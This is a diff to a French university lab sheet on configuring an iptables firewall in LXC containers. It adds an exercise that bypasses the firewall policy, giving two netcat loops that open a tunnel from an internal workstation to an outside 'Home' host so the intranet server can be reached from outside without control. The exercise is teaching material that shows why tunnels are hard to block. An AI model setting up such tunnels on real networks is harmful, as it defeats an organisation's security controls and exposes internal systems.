@@ -12,6 +12,7 @@ Une fois l'environnement démarré, le firewall est à configurer sur la machine
 
 Avant de commencer le TP, vous devez lire le chapitre [Netfilter](https://fr.wikibooks.org/wiki/Administration_r%C3%A9seau_sous_Linux/Netfilter) du Wikibook "Administration Réseau sous Linux".
 
+_Note : Pour les plus aventuriers, il est possible d'utiliser nftables au lieu d'iptables_
 
 Protection de la machine firewall
 =================================
@@ -123,6 +124,33 @@ Implémentez votre matrice de flux sur la machine firewall. Vous aurez besoin de
 	* L'associer au conteneur : `lxc-device -n <nom_du_conteneur> add <nom_temporaire> <nom_dans_le_conteneur>`
 	* Puis la configurer dans le conteneur (up, adresse IP)
 
+
+Évaluation
+----------
+
+Évaluez le déroulé du scénario d'intrusion réalisé au TP1 une fois les règles de firewall déployées.
+
+
+Contournement de la politique
+-----------------------------
+
+Vous souhaitez fournir un accès vers un serveur interne de prototypage (intranet) à un client externe. Vous allez créer un tunnel pour contourner la politique de sécurité. Vous disposez pour cela des machines "dev" (votre poste de travail interne) et "Home" (une machine extérieure, à votre domicile).
+
+Côté home :
+```	
+service apache2 stop   # Libération du port 80
+while true; do nc -v -l -p 80 -c "nc -l -p 8080"; done
+```
+
+Côté dev :
+
+`while true; do nc 10.0.0.3 80 -c "nc 192.168.0.5 80"; sleep 2; done`
+
+Testez (avec la machine du hacker) que vous pouvez bien accéder au serveur intranet sans aucun contrôle via l'URL `http://10.0.0.3:8080`
+
+Il est très difficile de bloquer ou même détecter les tunnels (imaginez un tunnel chiffré par SSH, ou qui mime une apparence de HTTP, etc.)
+
+
 Bonus
 =====
 
@@ -139,4 +167,3 @@ FTP
 FTP, comme quelques autre protocoles, présente des difficultés particulières pour les firewall. En effet, la partie contrôle de FTP se passe sur une connexion (et un port) distinct de la partie données. Les firewalls modernes savent créer le lien entre ces deux connexions pour y appliquer un contrôle adapté.
 
 Un serveur FTP est installé dans la DMZ, configurez le firewall pour permettre son usage depuis une machine externe au SI. Attention, le FTP demande une connexion avec un utilisateur existant, par exemple debian/debian.
-
